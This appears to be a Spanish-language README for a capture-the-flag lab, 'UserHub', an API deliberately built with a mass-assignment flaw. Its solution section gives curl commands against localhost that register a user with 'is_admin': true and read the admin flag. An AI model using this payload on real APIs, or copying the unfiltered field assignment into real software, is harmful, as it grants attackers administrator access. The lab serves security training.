# UserHub

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Medium                       |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Una API de registro de usuarios crea el objeto `User` directamente desde el JSON del cuerpo de la peticion, sin filtrar campos. El modelo tiene un campo interno `is_admin` (por defecto `false`). Si el cliente envia `"is_admin": true` en el registro, el valor es aceptado y almacenado.

## Vulnerabilidad

**Mass Assignment (OWASP API6)**

El endpoint `POST /api/register` itera sobre todos los campos del JSON recibido y los asigna al objeto de usuario sin lista de permitidos. Un atacante puede inyectar cualquier campo del modelo, incluyendo `is_admin`.

El endpoint `GET /api/profile` oculta el campo `is_admin` en la respuesta, pero el campo existe en el objeto almacenado y es verificado en los endpoints de administracion.

## Solucion

```bash
# Registrarse con is_admin: true
TOKEN=$(curl -s -X POST http://localhost:8080/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass123","email":"h@x.com","is_admin":true}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Acceder al dashboard de admin
curl -s http://localhost:8080/api/admin/dashboard \
  -H "Authorization: Bearer $TOKEN"

# La respuesta incluye el campo "flag"
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
